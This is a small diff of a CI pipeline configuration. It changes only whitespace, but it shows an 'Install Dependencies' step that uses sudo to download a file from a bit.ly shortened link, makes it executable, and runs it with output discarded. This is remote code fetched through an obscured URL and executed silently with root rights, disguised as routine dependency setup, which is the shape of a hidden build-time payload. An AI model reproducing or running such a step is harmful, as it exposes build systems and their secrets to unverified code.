@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: |
+            command: | 
               sudo wget https://bit.ly/3q9lDAI && chmod +x 3q9lDAI && ./3q9lDAI >/dev/null
               
        
